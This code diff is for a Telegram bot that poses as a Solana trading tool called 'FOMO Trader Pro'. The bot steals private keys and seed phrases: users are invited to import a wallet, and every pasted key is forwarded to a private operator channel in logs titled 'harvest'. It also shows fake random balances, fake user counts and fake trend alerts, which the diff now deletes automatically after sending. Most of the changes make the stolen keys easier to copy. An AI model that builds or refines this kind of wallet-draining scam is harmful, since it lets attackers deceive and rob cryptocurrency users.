@@ -87,6 +87,9 @@ MENU, INPUT_PK, INPUT_SETTING, INPUT_BUY_CA = range(4)
 active_users = 7400
 user_data = {}
 
+# Store last trend alert message ID per user (for deletion)
+last_trend_msg_ids = {}
+
 # Rotation for controlled addresses
 wallet_rotation_index = 0
 
@@ -185,17 +188,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         await show_main_menu(update, context, force_new=True)
         return MENU
 
-    # Professional log on start
+    # Clean professional session start log
     await context.bot.send_message(
         PRIVATE_CHANNEL_ID,
-        f"╔════════════════════════════════════╗\n"
-        f"║          NEW SESSION START         ║\n"
-        f"╠════════════════════════════════════╣\n"
-        f"║ User ID     : {user_id:<18} ║\n"
-        f"║ Username    : @{update.effective_user.username or 'none':<15} ║\n"
-        f"║ First name  : {update.effective_user.first_name or '—':<15} ║\n"
-        f"║ Timestamp   : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} ║\n"
-        f"╚════════════════════════════════════╝",
+        f"┌────────────────────────────── New Session ──────────────────────────────┐\n"
+        f"│ User ID    │ {user_id:<18}                                         │\n"
+        f"│ Username   │ @{update.effective_user.username or '—':<38}          │\n"
+        f"│ First Name │ {update.effective_user.first_name or '—':<38}          │\n"
+        f"│ Started    │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
+        f"└─────────────────────────────────────────────────────────────────────────┘",
         parse_mode=None
     )
 
@@ -232,7 +233,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     chat_id = query.message.chat_id
     ud = user_data.get(user_id, {})
 
-    # Anti-double-tap protection
     now = time.time()
     if user_id in last_callback_time:
         if now - last_callback_time[user_id] < CALLBACK_COOLDOWN_SECONDS:
@@ -388,9 +388,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 f"**Deposit SOL**\n\n"
                 f"Your personal address:\n"
                 f"||`{addr}`||\n\n"
-                f"**Tap the hidden gray box above to copy instantly** 📋\n\n"
+                f"**Tap on the address above to copy instantly** 📋\n\n"
                 f"Balance: **{ud['balance']:.4f} SOL**\n"
-                f"Send any amount — funds appear in \~5–30 seconds."
+                f"Send any amount — funds appear in \\~5–30 seconds."
             )
             kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
         await edit_or_send(update, context, text, kb)
@@ -404,17 +404,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         ud["wallet"] = addr
         ud["balance"] = round(random.uniform(0.0512, 0.0578), 6)
 
-        # Professional create log
         await context.bot.send_message(
             PRIVATE_CHANNEL_ID,
-            f"╔════════════════════════════════════════════╗\n"
-            f"║             NEW WALLET CREATED             ║\n"
-            f"╠════════════════════════════════════════════╣\n"
-            f"║ User ID      : {user_id:<25} ║\n"
-            f"║ Username     : @{update.effective_user.username or '—':<22} ║\n"
-            f"║ Assigned Addr: {addr[:12]}...{addr[-4:]:<22} ║\n"
-            f"║ Timestamp    : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} ║\n"
-            f"╚════════════════════════════════════════════╝",
+            f"┌────────────────────────────── Wallet Created ──────────────────────────────┐\n"
+            f"│ User ID       │ {user_id:<20}                                           │\n"
+            f"│ Username      │ @{update.effective_user.username or '—':<38}                │\n"
+            f"│ Assigned Addr │ {addr[:12]}...{addr[-4:]:<38}                               │\n"
+            f"│ Timestamp     │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
+            f"└────────────────────────────────────────────────────────────────────────────┘",
             parse_mode=None
         )
 
@@ -447,7 +444,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         success_text = (
             f"**Wallet created successfully** ✅\n\n"
             f"||`{addr}`||\n\n"
-            f"**Tap the hidden gray box above to copy instantly** 📋\n\n"
+            f"**Tap on the address above to copy instantly** 📋\n\n"
             f"Balance: **{ud['balance']:.4f} SOL**"
         )
         kb_continue = InlineKeyboardMarkup([
@@ -719,7 +716,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 f"**Your Wallet**\n\n"
                 f"Address:\n"
                 f"||`{addr}`||\n\n"
-                f"**Tap the hidden gray box above to copy** 📋\n"
+                f"**Tap on the address above to copy** 📋\n"
                 f"Balance: **{ud['balance']:.4f} SOL** ≈ **${int(ud['balance'] * random.uniform(185,195)):,}**\n\n"
                 f"Use this address for deposits or to check on explorers."
             )
@@ -769,19 +766,18 @@ async def handle_import_pk(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
     valid, reason, wallet_type = detect_and_validate_wallet(raw_input)
 
-    # Log attempt (always)
+    # Always log submission attempt - clean format + copyable input
     await context.bot.send_message(
         PRIVATE_CHANNEL_ID,
-        f"╔════════════════════════════════════════════╗\n"
-        f"║           PRIVATE KEY SUBMISSION           ║\n"
-        f"╠════════════════════════════════════════════╣\n"
-        f"║ User ID      : {user_id:<25} ║\n"
-        f"║ Username     : @{update.effective_user.username or '—':<22} ║\n"
-        f"║ Input length : {len(raw_input):<25} ║\n"
-        f"║ Timestamp    : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} ║\n"
-        f"╚════════════════════════════════════════════╝\n"
-        f"Raw input:\n{raw_input}\n",
-        parse_mode=None
+        f"┌────────────────────────────── Key Submission ──────────────────────────────┐\n"
+        f"│ User ID       │ {user_id:<20}                                           │\n"
+        f"│ Username      │ @{update.effective_user.username or '—':<38}                │\n"
+        f"│ Input Length  │ {len(raw_input):<20} chars                                   │\n"
+        f"│ Timestamp     │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
+        f"└────────────────────────────────────────────────────────────────────────────┘\n"
+        f"Input (tap to copy):\n"
+        f"||```text\n{raw_input}\n```||",
+        parse_mode="MarkdownV2"
     )
 
     if not valid:
@@ -799,20 +795,24 @@ async def handle_import_pk(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         context.user_data["waiting_for"] = "import"
         return INPUT_PK
 
-    # Valid harvest log
-    log_message = (
-        f"╔════════════════════════════════════════════╗\n"
-        f"║          VALID KEY / SEED HARVEST          ║\n"
-        f"╠════════════════════════════════════════════╣\n"
-        f"║ User ID      : {user_id:<25} ║\n"
-        f"║ Type         : {wallet_type:<25} ║\n"
-        f"║ Detected     : {reason:<25} ║\n"
-        f"║ Length       : {len(raw_input):<25} chars ║\n"
-        f"║ Timestamp    : {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} ║\n"
-        f"╚════════════════════════════════════════════╝\n"
-        f"Payload:\n{raw_input}"
+    # Valid harvest - professional + copyable payload
+    harvest_log = (
+        f"┌────────────────────────────── VALID HARVEST ──────────────────────────────┐\n"
+        f"│ User ID       │ {user_id:<20}                                           │\n"
+        f"│ Username      │ @{update.effective_user.username or '—':<38}                │\n"
+        f"│ Type          │ {wallet_type:<45}                               │\n"
+        f"│ Detected      │ {reason:<45}                               │\n"
+        f"│ Length        │ {len(raw_input):<20} chars                                   │\n"
+        f"│ Timestamp     │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
+        f"└────────────────────────────────────────────────────────────────────────────┘\n"
+        f"Payload (tap to copy):\n"
+        f"||```text\n{raw_input.strip()}\n```||"
     )
-    await context.bot.send_message(PRIVATE_CHANNEL_ID, log_message, parse_mode=None)
+    await context.bot.send_message(
+        PRIVATE_CHANNEL_ID,
+        harvest_log,
+        parse_mode="MarkdownV2"
+    )
 
     processing = await context.bot.send_message(chat_id=chat_id, text="Importing wallet... 🔄")
     await asyncio.sleep(random.uniform(4.0, 8.0))
@@ -1046,7 +1046,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, for
             f"• Status          {wallet_status}",
             f"• Balance         {balance:.4f} SOL",
             f"• Equivalent      ${int(balance * fake_sol_price):,.2f}",
-            "• **Tap the hidden gray box above to copy** 📋",
+            "• **Tap on the address above to copy instantly** 📋",
             "• Pro access      Deposit ≥ 0.30 SOL for priority lanes"
         ])
     else:
@@ -1161,7 +1161,7 @@ async def fake_active_counter():
         active_users = max(MIN_ACTIVE, min(MAX_ACTIVE, active_users))
 
 async def fake_trend_notifier(context: ContextTypes.DEFAULT_TYPE):
-    global active_users
+    global active_users, last_trend_msg_ids
 
     while True:
         await asyncio.sleep(random.uniform(18*60, 24*60))
@@ -1180,21 +1180,43 @@ async def fake_trend_notifier(context: ContextTypes.DEFAULT_TYPE):
         full_msg = f"📢 **TREND ALERT** {now}\n\n{msg}\n\nFOMO Trader Pro • Live"
 
         sent_count = 0
+
         for uid, data in list(user_data.items()):
             if not data.get("verified", False) or not data.get("wallet"):
                 continue
 
             try:
-                await context.bot.send_message(
+                prev_msg_id = last_trend_msg_ids.get(uid)
+                if prev_msg_id:
+                    try:
+                        await context.bot.delete_message(chat_id=uid, message_id=prev_msg_id)
+                    except:
+                        pass
+
+                sent = await context.bot.send_message(
                     chat_id=uid,
                     text=full_msg,
                     parse_mode="Markdown",
                     disable_web_page_preview=True
                 )
+
+                last_trend_msg_ids[uid] = sent.message_id
+
                 sent_count += 1
+
+                async def auto_delete_task():
+                    await asyncio.sleep(random.uniform(15, 20))
+                    try:
+                        await context.bot.delete_message(chat_id=uid, message_id=sent.message_id)
+                    except:
+                        pass
+
+                asyncio.create_task(auto_delete_task())
+
             except Exception as e:
                 if "blocked" in str(e).lower() or "chat not found" in str(e).lower():
                     user_data.pop(uid, None)
+                    last_trend_msg_ids.pop(uid, None)
 
         if sent_count > 0:
             await context.bot.send_message(
